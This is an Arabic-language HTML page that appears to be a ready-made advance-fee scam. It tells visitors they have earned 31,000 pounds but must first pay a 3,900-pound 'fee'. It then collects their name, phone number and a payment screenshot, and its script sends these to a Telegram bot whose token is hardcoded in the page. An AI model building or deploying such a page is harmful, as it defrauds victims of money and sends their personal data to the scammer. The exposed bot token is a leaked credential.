<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>سحب الأرباح</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            direction: rtl;
            text-align: center;
            background: #f4f4f4;
            padding-top: 40px;
        }

        h2 {
            margin-bottom: 20px;
        }

        button {
            padding: 10px 25px;
            font-size: 18px;
            cursor: pointer;
            background: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
        }

        .form-box {
            display: none;
            margin-top: 20px;
            background: white;
            padding: 20px;
            width: 320px;
            margin-left: auto;
            margin-right: auto;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }

        .alert {
            background: #fff3cd;
            color: #856404;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 15px;
            font-weight: bold;
            font-size: 14px;
        }

        input {
            width: 95%;
            padding: 8px;
            margin: 8px 0;
            font-size: 16px;
        }

        label {
            display: block;
            margin-top: 10px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <h2>قائمة الأرباح</h2>

    <button onclick="showForm()">سحب أرباحك</button>

    <div class="form-box" id="withdrawForm">

        <div class="alert">
            أرباحك <strong>31,000</strong> جنيه<br>
            يجب دفع الرسوم <strong>3,900</strong> جنيه<br>
            لاستلام أرباحك
        </div>

        <input type="text" id="name" placeholder="ادخل اسمك" required>
        <input type="tel" id="phone" placeholder="ادخل رقمك" required>

        <label>ارفع اسكرين إثبات الدفع</label>
        <input type="file" id="screenshot" accept="image/*" required>

        <br><br>
        <button onclick="sendToTelegram()">إرسال الطلب</button>
    </div>

    <script>
        // التوكن الخاص بك
        const BOT_TOKEN = "8349631082:AAEkhEPtJoxG2xszGCTs05WNMl3VRzcOTZ4";
        // قم بتغيير هذا الرقم إلى الآيدي الخاص بك في تيليجرام لاستقبال الرسائل
        const CHAT_ID = "YOUR_CHAT_ID"; 

        function showForm() {
            document.getElementById("withdrawForm").style.display = "block";
        }

        async function sendToTelegram() {
            const name = document.getElementById("name").value;
            const phone = document.getElementById("phone").value;
            const fileInput = document.getElementById("screenshot");

            if (!name || !phone || fileInput.files.length === 0) {
                alert("يرجى ملء جميع البيانات ورفع الصورة");
                return;
            }

            const file = fileInput.files[0];
            const formData = new FormData();
            
            // صياغة الرسالة
            const message = `طلب سحب جديد:\nالاسم: ${name}\nرقم الهاتف: ${phone}`;

            formData.append("chat_id", CHAT_ID);
            formData.append("photo", file);
            formData.append("caption", message);

            alert("جاري إرسال الطلب...");

            try {
                // إرسال الصورة والبيانات
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });
                alert("تم إرسال الطلب بنجاح!");
            } catch (error) {
                console.error(error);
                alert("حدث خطأ أثناء الإرسال");
            }
        }
    </script>

</body>
</html>
